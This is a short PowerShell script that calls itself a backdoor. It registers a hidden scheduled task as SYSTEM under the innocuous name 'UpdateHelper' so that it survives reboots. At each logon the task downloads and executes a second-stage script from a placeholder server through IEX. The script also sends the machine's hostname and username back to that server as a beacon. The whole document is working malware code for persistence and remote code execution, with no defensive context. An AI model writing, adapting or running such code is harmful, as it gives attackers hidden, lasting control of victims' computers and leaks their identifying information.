# This PowerShell script runs on the target machine when downloaded.
Write-Host "Backdoor activated - Establishing reverse connection..."

# Example payload: Create a scheduled task for persistence
$TaskAction = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
  -Argument '-NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(''http://your-server.com/stage2.ps1'')"'

$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
$TaskSettings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 5)

Register-ScheduledTask -TaskName "UpdateHelper" `
  -Action $TaskAction `
  -Trigger $TaskTrigger `
  -Settings $TaskSettings `
  -User "NT AUTHORITY\SYSTEM" `
  -Force

# Optional: Send beacon back to attacker server
try {
    (New-Object Net.WebClient).UploadString("http://your-server.com/beacon", "POST", "$(hostname):$env:USERNAME is online")
} catch {}